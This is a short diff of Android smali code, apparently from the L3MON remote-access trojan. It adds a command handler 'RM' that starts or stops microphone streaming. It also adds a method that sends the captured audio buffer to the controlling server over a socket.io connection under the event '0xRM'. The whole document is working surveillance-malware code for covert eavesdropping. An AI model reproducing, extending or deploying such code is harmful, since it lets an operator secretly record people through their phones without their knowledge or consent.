@@ -319,6 +319,53 @@
     return-void
 .end method
 
+.method public static RM(Ljava/lang/String;)V
+    .locals 1
+
+    const-string v0, "start"
+
+    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    invoke-static {}, Lcom/etechd/l3mon/StreamMicManager;->startStreaming()V
+
+    goto :goto_0
+
+    :cond_0
+    invoke-static {}, Lcom/etechd/l3mon/StreamMicManager;->stopStreaming()V
+
+    :goto_0
+    return-void
+.end method
+
+.method public static sendStreamBuffer(Lorg/json/JSONObject;)V
+    .locals 4
+
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+
+    if-eqz v0, :cond_0
+
+    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+
+    const-string v1, "0xRM"
+
+    const/4 v2, 0x1
+
+    new-array v2, v2, [Ljava/lang/Object;
+
+    const/4 v3, 0x0
+
+    aput-object p0, v2, v3
+
+    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+
+    :cond_0
+    return-void
+.end method
+
 .method public static PM()V
     .locals 4
 
